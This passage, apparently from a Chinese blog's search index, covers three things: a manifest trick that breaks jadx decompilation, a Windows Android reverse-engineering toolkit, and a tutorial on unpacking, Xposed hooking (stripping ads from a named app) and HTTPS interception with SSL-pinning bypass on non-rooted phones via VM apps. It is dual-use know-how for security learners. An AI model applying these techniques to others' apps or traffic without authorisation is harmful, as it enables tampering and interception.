src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer9/Untitled%208.png\" alt=\"Untitled\"></p>\n<h2 id=\"4-manifest文件防护\"><a href=\"#4-manifest文件防护\" class=\"headerlink\" title=\"4.manifest文件防护\"></a>4.manifest文件防护</h2><ul>\n<li>总结下反编译失败的原因就是在<strong>string offsets</strong>和<strong>string pool中间加了4个00 然后修改：</strong><ul>\n<li><strong>整个文件大小加4</strong></li>\n<li><strong>String Chunk的大小加4</strong></li>\n<li><strong>stringPooloffset的大小加4</strong></li>\n</ul>\n</li>\n<li>从而导致jadx反编译失败，但安卓系统的解析应该不会受到影响</li>\n<li>所以一个manifest防护的思路就诞生了</li>\n<li>不过目前的思路只能是打包后一个apk后将manifest文件拿出来进行修改后重新打包进行签名</li>\n<li>manifest文件和脚本：<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">链接：https://pan.baidu.com/s/1Qo4cfLHc3ZYElBR1qdhMog </span><br><span class=\"line\">提取码：13f7 </span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>用法可见：</p>\n<p><a href=\"https://github.com/Sp1keeeee/manifestGuard\">https://github.com/Sp1keeeee/manifestGuard</a></p>\n<h2 id=\"5-参考\"><a href=\"#5-参考\" class=\"headerlink\" title=\"5.参考\"></a>5.参考</h2><p><a href=\"https://bbs.pediy.com/thread-194206.htm\">https://bbs.pediy.com/thread-194206.htm</a></p>\n<p><a href=\"https://bbs.pediy.com/thread-272045.htm\">https://bbs.pediy.com/thread-272045.htm</a></p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android App漏洞之战（2）——（Windows）Android安全工具包","url":"/2023/02/09/bug0002/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>在我更新Android APP漏洞之战系列文章过程中，收到的很多朋友的私信，特别是一些刚刚入门Android安全的朋友，问的最多的问题是下载哪些工具，其实工具很多网上和看雪论坛上都可以找到，我平时一般Linux端用的较多，而Windows端有时候也会使用，由于换了几次电脑，感觉每次重装这些工具太过于麻烦，所以在前人的基础上，我将其集成并更新整理了，大家只需要下载就可以开包使用，工具包：知识星球安全后厨自取。</p>\n<span id=\"more\"></span>\n<p>废话不多说，直接上图：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/1.png\" alt=\"image-20220927170648644\"></p>\n<p>Android逆向工具包结构分析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）Android逆向基础工具</span><br><span class=\"line\">（2）抓包工具</span><br><span class=\"line\">（3）编辑工具</span><br><span class=\"line\">（4）加密解密工具</span><br><span class=\"line\">（5）环境配置工具</span><br><span class=\"line\">（6）查壳破壳工具</span><br><span class=\"line\">（7）调教系统工具</span><br><span class=\"line\">（8）伪装校验工具</span><br><span class=\"line\">（9）实用软件工具</span><br></pre></td></tr></table></figure>\n\n<p>适用环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Windows10 其他系统版本大家自行测试</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、工具包结构分析\"><a href=\"#二、工具包结构分析\" class=\"headerlink\" title=\"二、工具包结构分析\"></a>二、工具包结构分析</h2><h3 id=\"1-Android逆向工具\"><a href=\"#1-Android逆向工具\" class=\"headerlink\" title=\"1.Android逆向工具\"></a>1.Android逆向工具</h3><p>Android逆向工具包基本上可以帮助你解决Apk所有java层的分析，你可以使用这些工具完成逆向、重打包、动态调试、开发、运行、Hook等基本操作</p>\n<h4 id=\"（1）JEB\"><a href=\"#（1）JEB\" class=\"headerlink\" title=\"（1）JEB\"></a>（1）JEB</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">JEB3.0 环境要求：jdk1.8</span><br><span class=\"line\">JEB4.19 环境要求：jdk11</span><br></pre></td></tr></table></figure>\n\n<p>JEB是一款可以进行Android APP逆向和动态调试的工具，在一般的逆向工作中主要作用于java层的分析</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/2.png\" alt=\"image-20220927183405539\"></p>\n<h4 id=\"（2）ApktoolBox\"><a href=\"#（2）ApktoolBox\" class=\"headerlink\" title=\"（2）ApktoolBox\"></a>（2）ApktoolBox</h4><p>该工具可以反编译apk，进行签名打包，查壳还执行机器码和Arm指令转换</p>\n<p><img src=\"/images%5C3.png\" alt=\"image-20220927183631578\"></p>\n<h4 id=\"（3）So-Helper\"><a href=\"#（3）So-Helper\" class=\"headerlink\" title=\"（3）So Helper\"></a>（3）So Helper</h4><p>无名侠大佬开发的工具，可以对so文件进行静态分析</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/4.png\" alt=\"image-20220927183846055\"></p>\n<h4 id=\"（4）APK改之理\"><a href=\"#（4）APK改之理\" class=\"headerlink\" title=\"（4）APK改之理\"></a>（4）APK改之理</h4><p>该工具用于逆向apk，分析java层代码，修改smali源码，与AndroidKiller作用相同</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/5.png\" alt=\"image-20220927184022185\"></p>\n<h4 id=\"（5）SmaliViewer\"><a href=\"#（5）SmaliViewer\" class=\"headerlink\" title=\"（5）SmaliViewer\"></a>（5）SmaliViewer</h4><p>该工具简易的逆向apk，分析smali源码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/6.png\" alt=\"image-20220927184141460\"></p>\n<h4 id=\"（6）雷电模拟器\"><a href=\"#（6）雷电模拟器\" class=\"headerlink\" title=\"（6）雷电模拟器\"></a>（6）雷电模拟器</h4><p>模拟器大家就很熟悉了，类似还有夜神模拟器等，适合没有真机的朋友使用</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/7.png\" alt=\"image-20220927184315074\"></p>\n<h4 id=\"（7）XAD\"><a href=\"#（7）XAD\" class=\"headerlink\" title=\"（7）XAD\"></a>（7）XAD</h4><p>检测APK文件的信息熵的工具，还可以分析相关的源码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/8.png\" alt=\"image-20220927184553464\"></p>\n<h4 id=\"（8）jadx-gui\"><a href=\"#（8）jadx-gui\" class=\"headerlink\" title=\"（8）jadx-gui\"></a>（8）jadx-gui</h4><p>该工具是使用较为简单的反编译工具，功能简单且使用</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/9.png\" alt=\"image-20220927184651192\"></p>\n<h4 id=\"（9）AndroidKiller\"><a href=\"#（9）AndroidKiller\" class=\"headerlink\" title=\"（9）AndroidKiller\"></a>（9）AndroidKiller</h4><p>逆向工具中使用比较受欢迎的，可以反编译，修改Smali源码</p>\n<p><img src=\"/assets/image-20220927184757655.png\" alt=\"image-20220927184757655\"></p>\n<h4 id=\"（10）GDA\"><a href=\"#（10）GDA\" class=\"headerlink\" title=\"（10）GDA\"></a>（10）GDA</h4><p>GDA是看雪版主大佬开发的一个十分强大的Android逆向工具，集成了反汇编、壳识别、APK取证等，看雪上还有定制hook的GDA工具</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/11.png\" alt=\"image-20220927204111989\"></p>\n<h4 id=\"（11）fridaUiTools\"><a href=\"#（11）fridaUiTools\" class=\"headerlink\" title=\"（11）fridaUiTools\"></a>（11）fridaUiTools</h4><p>fridaUiTools是一个集成hook的工具，包括脱壳、Dump so、hook遍历、解密、抓包绕过等等</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/12.png\" alt=\"image-20220927204513573\"></p>\n<p>到这里Android逆向工具基本介绍完毕，平时我使用比较多AndroidStudio+JEB+AndroidKiller+GDA+fridaUiTools就可以解决大部分分析问题了</p>\n<h3 id=\"2-抓包工具\"><a href=\"#2-抓包工具\" class=\"headerlink\" title=\"2.抓包工具\"></a>2.抓包工具</h3><p>抓包四兄弟：Fiddler+Charles+Burpsuite+Wireshark</p>\n<p>前三个主要负责应用层的抓包，其中Fiddler有很多脚本，操作较为简单，Charles可以导入证书，绕过双向认证，Burpsuite功能十分强大，渗透测试必用，WireShark针对传输层进行抓包</p>\n<p><strong>Fiddler:</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/13.png\" alt=\"image-20220927204930912\"></p>\n<p><strong>Charles:</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/14.png\" alt=\"image-20220927205318566\"></p>\n<p>Burpsuite这里没有下载，大家可以自己下载一下</p>\n<p>WireShark:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/15.png\" alt=\"image-20220927205416659\"></p>\n<h3 id=\"3-编辑工具\"><a href=\"#3-编辑工具\" class=\"headerlink\" title=\"3.编辑工具\"></a>3.编辑工具</h3><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/16.png\" alt=\"image-20220927205500193\"></p>\n<p>这里主要包括DB Browser+010Editor，其他两个是分析Windows端，这里就不仔细描述了</p>\n<h4 id=\"（1）DB-Browser\"><a href=\"#（1）DB-Browser\" class=\"headerlink\" title=\"（1）DB Browser\"></a>（1）DB Browser</h4><p>数据库管理软件，可以打开一些数据库的文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/17.png\" alt=\"image-20220927205640346\"></p>\n<h4 id=\"（2）010-Eidtor\"><a href=\"#（2）010-Eidtor\" class=\"headerlink\" title=\"（2）010 Eidtor\"></a>（2）010 Eidtor</h4><p>十分强大的二进制分析工具，分析各种二进制文件必备</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/18.png\" alt=\"image-20220927205805356\"></p>\n<h3 id=\"4-调试工具\"><a href=\"#4-调试工具\" class=\"headerlink\" title=\"4.调试工具\"></a>4.调试工具</h3><h4 id=\"（1）IDA调试工具\"><a href=\"#（1）IDA调试工具\" class=\"headerlink\" title=\"（1）IDA调试工具\"></a>（1）IDA调试工具</h4><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/19.png\" alt=\"image-20220927205932986\"></p>\n<p>这里面主要介绍IDA，十分强大的工具，动态调试、模拟执行、so分析等，功能很多</p>\n<h3 id=\"5-加密解密\"><a href=\"#5-加密解密\" class=\"headerlink\" title=\"5.加密解密\"></a>5.加密解密</h3><p>这里介绍精易编程助手，这款工具集成所有的编码解码功能，是一款十分强大的分析软件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/21.png\" alt=\"image-20220927210205751\"></p>\n<h3 id=\"6-其他工具\"><a href=\"#6-其他工具\" class=\"headerlink\" title=\"6.其他工具\"></a>6.其他工具</h3><p>主要的Android分析工具如上所示，下面一些其余的工具我提一下</p>\n<h4 id=\"（1）环境配置工具\"><a href=\"#（1）环境配置工具\" class=\"headerlink\" title=\"（1）环境配置工具\"></a>（1）环境配置工具</h4><p>快速布置jdk和adb的环境</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/22.png\" alt=\"image-20220927210325474\"></p>\n<h4 id=\"（2）Hash校验工具\"><a href=\"#（2）Hash校验工具\" class=\"headerlink\" title=\"（2）Hash校验工具\"></a>（2）Hash校验工具</h4><p>校验文件的Hash值</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/23.png\" alt=\"image-20220927210437807\"></p>\n<p>其他工具一些主要针对PE端逆向，一些是其他功能，和Android相关不大，就不一一介绍了</p>\n<h2 id=\"三、定制\"><a href=\"#三、定制\" class=\"headerlink\" title=\"三、定制\"></a>三、定制</h2><p>工具包最大的好处就可以进行定制，根据你自己的需求添加特定的应用集成，这样就不会到处找应用了</p>\n<p>定制步骤：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0002/24.png\" alt=\"image-20220927210745146\"></p>\n<p>自定义，将自己的应用路径和图片添加或直接放入就可以了，这样就可以根据个人的意向定制属于自己的工具包</p>\n<h2 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h2><p>本文主要打造Windows端的Android安全工具包，方便Windows端的朋友操作，当然分析用Linux端可能更加方便，大家也可以在Linux上操作</p>\n<p>本文的工具包上传知识星球：安全后厨，大家可以前往下载，也欢迎各位加入学习</p>\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（3）——（虚拟机）非root环境下hook、抓包、脱壳","url":"/2023/02/09/bug0003/","content":"<p>[TOC]</p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>近年来随着手机性能的不断增强，逆向分析过程中的三个基本技能：抓包、脱壳、Hook，研究测试人员使用比较多的便是Google系列机型，例如nexus系列、pixel系列，而国产的手机小米、一加也成为热门的测试机，这一切都很多程度上由于手机方便root，root作为众多逆向方法的基础，导致一个手机能否root成为选择的先决条件之一。针对非root手机，当前也存在着相应的解决方案，本文整合网上方法，实现非root环境下的抓包、脱壳、Hook。</p>\n<p>本文第二节简单介绍虚拟机基本知识</p>\n<p>本文第三节实现脱壳方案</p>\n<p>本文第四节实现hook方案</p>\n<p>本文第五节实现抓包方案</p>\n<span id=\"more\"></span>\n<h2 id=\"二、基础知识\"><a href=\"#二、基础知识\" class=\"headerlink\" title=\"二、基础知识\"></a>二、基础知识</h2><p>在了解手机虚拟机前，我们先看看虚拟化技术和容器化，Android上虚拟化技术应用到VitualBox、BlackBox等上，具体架构如下所示：</p>\n<p>传统虚拟机：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/18.png\"></p>\n<p>虚拟化容器：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/19.png\"></p>\n<p>两者之前的差异：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/17.png\"></p>\n<p>每个虚拟化容器相当于一个沙盒，容器与容器之间互不干扰；虚拟化容器作为一个应用级别抽象（进程级），而虚拟机是作为操作系统级别。</p>\n<p>而手机虚拟机不断的发展，现在的手机性能完全可以支持手机上运行多个虚拟机，因此虚拟机的研究也在快速发展，比较有代表的就是光速虚拟机、VMOS虚拟机、X8虚拟机等等，当然这些虚拟机也各有差异，下面就让我们简略了解各虚拟机的特点吧。</p>\n<h3 id=\"1-x8虚拟机\"><a href=\"#1-x8虚拟机\" class=\"headerlink\" title=\"1.x8虚拟机\"></a>1.x8虚拟机</h3><p>这个虚拟机就是一个简易的沙箱，就连官网也是这样描述的：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/image-20221216133518498.png\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/image-20221216143421932.png\" alt=\"image-20221216143421932\"></p>\n<p>沙箱机制的原理主要基于Linux系统的UID&#x2F;GID机制，Android对传统的Linux的UID&#x2F;GID机制进行了修改。在 Linux 中，一个用户 ID 识别一个给定用户;在 Android 上，一个用户 ID 识别一个应用程序。应用程序在安装时被分配用户 ID，应用程序在设备上的存续期间内，用户 ID 保持不变。其沙箱原理和VM技术类似，具体可以参考VitualBox原理，当然详细的技术原理，大家可以自行去研究。</p>\n<h3 id=\"2-VMOS虚拟机\"><a href=\"#2-VMOS虚拟机\" class=\"headerlink\" title=\"2.VMOS虚拟机\"></a>2.VMOS虚拟机</h3><p>VMOS虚拟机官网并未给出具体实现的技术细节，经过调研应该是采用了类似anbox技术，anbox技术是一种类似容器的实现方案，即Linux上运行Android系统，通过容器的方式运行，通俗的理解就是Android系统上可以运行Linux，而Linux内核通过Linux命名空间以容器方式运行Android虚拟机，</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/image-20221216142004548.png\" alt=\"image-20221216142004548\"></p>\n<p>这里我们看一个Anbox的基本原理图：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/image-20221216140319587.png\" alt=\"image-20221216140319587\"></p>\n<p>上图中可以看出 Anbox Session Manager做了三件事情：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.虚拟一个Android的sufaceflinger, 就是虚拟Android的图像系统，可以将Android里的不同APP渲染的结构进行图层的合成，使所有APP的渲染结果最终合成在一个窗口上</span><br><span class=\"line\">2.虚拟一个windowmanager，给Android里的APP提供对应的窗口</span><br><span class=\"line\">3.虚拟一个activitymanager，就是管理Android内部的进程的，比如app的启动，关闭等等</span><br></pre></td></tr></table></figure>\n\n<p>Anbox Container Manager则是和容器docker类似，来运行Android的镜像，因此Anbox将Android应用放入到容器中，无需直接访问硬件或数据，所有的硬件访问通过主机上的 anbox 守护进程，由于是直接使用本机的Linux内核，不是通过虚拟化所以导致性能极大提升。</p>\n<h3 id=\"3-光速虚拟机\"><a href=\"#3-光速虚拟机\" class=\"headerlink\" title=\"3.光速虚拟机\"></a>3.光速虚拟机</h3><p>根据光速虚拟机官网的描述，光速虚拟机是通过Android来实现Android，在安卓用户态实现了一个完整的安卓内核和安卓硬件抽象层</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/16.png\"></p>\n<p>从图中可以看出，光速通过代理虚拟化出了一个完完整的内核抽象层，在Android 内核基础上完整实现了内存管理，进程管理，文件系统和设备管理等安卓内核功能，这样就可以使得其内部运行不依赖手机内核。</p>\n<h3 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4.总结\"></a>4.总结</h3><p>综合三类虚拟机进行对比，具体的效果如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\">VMOS</th>\n<th align=\"center\">VMOS PRO</th>\n<th align=\"center\">光速虚拟机</th>\n<th>X8沙箱</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">内存占用</td>\n<td align=\"center\">186MB</td>\n<td align=\"center\">233MB</td>\n<td align=\"center\">188MB</td>\n<td>181MB</td>\n</tr>\n<tr>\n<td align=\"center\">提供root</td>\n<td align=\"center\">提供</td>\n<td align=\"center\">提供</td>\n<td align=\"center\">提供</td>\n<td>提供</td>\n</tr>\n<tr>\n<td align=\"center\">提供XP</td>\n<td align=\"center\">提供</td>\n<td align=\"center\">提供</td>\n<td align=\"center\">Magisk+Lsposed</td>\n<td>提供</td>\n</tr>\n<tr>\n<td align=\"center\">提供Play</td>\n<td align=\"center\">提供</td>\n<td align=\"center\">提供</td>\n<td align=\"center\">提供</td>\n<td>无</td>\n</tr>\n<tr>\n<td align=\"center\">程序兼容</td>\n<td align=\"center\">差</td>\n<td align=\"center\">好</td>\n<td align=\"center\">好</td>\n<td>好</td>\n</tr>\n<tr>\n<td align=\"center\">安卓版本</td>\n<td align=\"center\">5.1.1</td>\n<td align=\"center\">5.1.1 &#x2F; 7.1.2&#x2F;9.0</td>\n<td align=\"center\">7.1.2 10.0</td>\n<td>7.1</td>\n</tr>\n<tr>\n<td align=\"center\">是否含广告</td>\n<td align=\"center\">是</td>\n<td align=\"center\">是</td>\n<td align=\"center\">无</td>\n<td>视频广告</td>\n</tr>\n<tr>\n<td align=\"center\">权限要求</td>\n<td align=\"center\">电话、位置、相机、录音、存储</td>\n<td align=\"center\">无</td>\n<td align=\"center\">电话、位置、存储、录音、</td>\n<td>存储</td>\n</tr>\n</tbody></table>\n<p>这里也收集了网上用户的使用评价：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">VMOS Pro：能白嫖（启动速度比较慢，但这个支持的安卓版本最多）</span><br><span class=\"line\">51/X8虚拟机：要看广告，部分白嫖，功能比上一个少（启动速度第二）</span><br><span class=\"line\">光速虚拟机：暂时无需要付费功能（这个启动最快）光速10.0需要vip</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、非root环境下脱壳实现\"><a href=\"#三、非root环境下脱壳实现\" class=\"headerlink\" title=\"三、非root环境下脱壳实现\"></a>三、非root环境下脱壳实现</h2><h3 id=\"1-实验准备\"><a href=\"#1-实验准备\" class=\"headerlink\" title=\"1.实验准备\"></a>1.实验准备</h3><p>手机虚拟机VMOS + Magisk+反射大师</p>\n<p>实验手机：华为Mate10（非root）</p>\n<h3 id=\"2-实验步骤\"><a href=\"#2-实验步骤\" class=\"headerlink\" title=\"2.实验步骤\"></a>2.实验步骤</h3><p>VMOS可以提供不同版本的Android系统虚拟机，你可以根据需求来使用，这里我们拿Android7.1版来举例实操</p>\n<p>开启虚拟机已经支持了Xposed和root权限，我们再安装上wifiadb，就可以十分方便的进行逆向工作了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/30.png\" alt=\"image-20221020112024592\"></p>\n<p>我们测试一下root权限</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/31.png\" alt=\"image-20221020112322217\"></p>\n<p>然后这里我们使用DITOR的脱壳模块进行快速脱壳</p>\n<p>打开模块，我们可以选择动态注入就是Xposed，以及此模块还支持frida注入，但是虚拟机不支持frida，这里我们就选择动态注入</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/32.png\" alt=\"image-20221020112203767\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/33.png\"></p>\n<p>这里我们选择需要脱壳的目标应用，这里就选第一个</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/34.png\" alt=\"image-20221020112749115\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/35.png\" alt=\"image-20221020112810032\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/36.png\" alt=\"image-20221020112840431\"></p>\n<p>然后我们把保存的dex打开</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/37.png\" alt=\"image-20221020112930742\"></p>\n<p>成功的脱壳，这样是不是脱壳工作变得十分简单了</p>\n<h2 id=\"四、非root环境下Hook实现\"><a href=\"#四、非root环境下Hook实现\" class=\"headerlink\" title=\"四、非root环境下Hook实现\"></a>四、非root环境下Hook实现</h2><h3 id=\"1-实验准备-1\"><a href=\"#1-实验准备-1\" class=\"headerlink\" title=\"1.实验准备\"></a>1.实验准备</h3><p>手机虚拟机（光速）+Magisk+Xposed</p>\n<p>实验手机：华为Mate10（非root）</p>\n<h3 id=\"2-实验步骤-1\"><a href=\"#2-实验步骤-1\" class=\"headerlink\" title=\"2.实验步骤\"></a>2.实验步骤</h3><p>这里我们再换一个虚拟机来操作，上面的VMOS其实已经实现的hook操作</p>\n<p>我们可以安装手机虚拟机，例如光遇虚拟机，然后在虚拟机中安装Magisk，安装Xposed，这样我们就可以使用前面功能，还可以应对更多场景</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/25.png\" alt=\"image-20221016193759059\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/26.png\" alt=\"image-20221016193834221\"></p>\n<p>这样是不是一些有Magisk需求的朋友也可以快速的进行使用了，这里我们就直接使用Lsposed，进入仓库选择一个模块</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/39.png\" alt=\"image-20221216172909835\"></p>\n<p>我们直接安装完成，然后再下载某乎应用，我们来测试一下hook效果</p>\n<p>首先我们在真机上下载某乎应用，发现每次进去都会有广告：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/38.png\" alt=\"image-20221216173049242\"></p>\n<p>我们进入虚拟机，然后打开会发现加载知了模块</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/40.png\" alt=\"image-20221216173211733\"></p>\n<p>然后我们进某乎的设置，进行开启模块，这个时候就会发现没有广告了，比如加入标题提示：</p>\n<p>Hook前：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/41.png\" alt=\"image-20221216173609768\"></p>\n<p>Hook后：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/42.png\" alt=\"image-20221216173656004\"></p>\n<p>是不是感觉Hook功能又好用起来了呢</p>\n<h2 id=\"五、非root环境下抓包实现\"><a href=\"#五、非root环境下抓包实现\" class=\"headerlink\" title=\"五、非root环境下抓包实现\"></a>五、非root环境下抓包实现</h2><p>很多朋友使用抓包工具，比如Fiddler、Charles、Burpsuit等，我们都知道在Android7.0后，系统只信任根目录下的证书，而以往用户目录下的证书不可信，导致之前的https流量无法抓取，当然针对高版本的Android，不少用户采用抓包应用证书移植到手机的根目录下，比如常用的MoveCertificate模块等，但是这些都基本针对root环境的手机比较容易操作，但是针对非root环境的手机就不是很容易操作了，本文主要讲述网络上另一种非root环境抓包的思路：</p>\n<p>VMOS Pro+小黄鸟HttpCanary+MT管理器 实现非root环境下抓包</p>\n<h3 id=\"1-实验准备-2\"><a href=\"#1-实验准备-2\" class=\"headerlink\" title=\"1.实验准备\"></a>1.实验准备</h3><p>VMOS Pro+小黄鸟HttpCanary+MT管理器+QtScrcpy</p>\n<p>实验手机：华为Mate10（非root）</p>\n<p>这些工具都上传过知识星球：安全后厨，需要朋友前往星球自取</p>\n<h3 id=\"2-实验步骤-2\"><a href=\"#2-实验步骤-2\" class=\"headerlink\" title=\"2.实验步骤\"></a>2.实验步骤</h3><p>（1）真机安装小黄鸟HttpCanay和安卓虚拟机Vmos Pro</p>\n<p>这里我们使用投屏软件QtScrcpy来记录本次实验</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/1.png\" alt=\"image-20221208120524937\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/2.png\" alt=\"image-20221208120650953\"></p>\n<p>（2）安装好小黄鸟，在小黄鸟里的设置中，目标应用-指定为VMOSPro</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/3.png\" alt=\"image-20221208120801527\"></p>\n<p>（3）可以手机安装证书，SSL证书设置-选择导出根证书，类型System Trusted (.0)； 导出的证书储存路径为：内部储存&#x2F;HttpCanary&#x2F;cert&#x2F;</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/4.png\" alt=\"image-20221208120901930\"></p>\n<p>首次没有安装证书的，可能需要安装一下证书，这里就直接安装就可以了，安装后导出证书</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/5.png\" alt=\"image-20221208121134998\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/6.png\" alt=\"image-20221208121149012\"></p>\n<p>（4）打开虚拟机VMOSPro，新建一个虚拟机，这里可以使用Android7极客版，然后给root权限</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/7.png\" alt=\"image-20221208121623860\"></p>\n<p>（5）导入你要抓包的目标APP（或者apk安装包）+xxxxx.0格式的证书（这个证书就是第3步获取的证书）；打开MT文件管理器，刚刚导入的证书自动保存在虚拟机的VMOSfiletransferstatio目录下，将其复制到虚拟机的系统内：&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;目录下即可</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/8.png\" alt=\"image-20221208121725440\"></p>\n<p>并在虚拟机中安装MT管理器，并打开，并移动证书到右边</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/9.png\" alt=\"image-20221208121937325\"></p>\n<p>（6）在vmospro里安装好小黄鸟，打开，点击开始抓包，会提示安装CA证书，根据提示安装即可，会让你设置锁屏密码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/10.png\" alt=\"image-20221208122102503\"></p>\n<p>（9）返回真机启动小黄鸟，注意是在真机里抓包，而不是在vmosPRO虚拟机里抓包！！目标应用-设置VMOS-开启抓包 返回虚拟机-启动目标APP 即可在真机抓包了</p>\n<p>这里我们虚拟机设置为目标APP为浏览器，这里你可以设置你需要抓包的应用</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/11.png\" alt=\"image-20221208122254465\"></p>\n<p>然后真机中选择目标应用为VMOSPRO开始抓包</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/12.png\" alt=\"image-20221208122425563\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/13.png\" alt=\"image-20221208122537987\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/14.png\" alt=\"image-20221208122728168\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0003/15.png\" alt=\"image-20221208122954403\"></p>\n<p>可以发现就成功的抓包了，当然我们结合VMOSPro中的Xposed，还可以安装JustMe，可以绕过一般的SSLpining</p>\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>本文演示了非root环境下的抓包、脱壳与Hook，这里只是给非root环境手机逆向的一种方案，经过测试实际使用还未达到root环境真机的效能，感兴趣的大家可以自行的探索了，相应的可以关注github：</p>\n<p><a 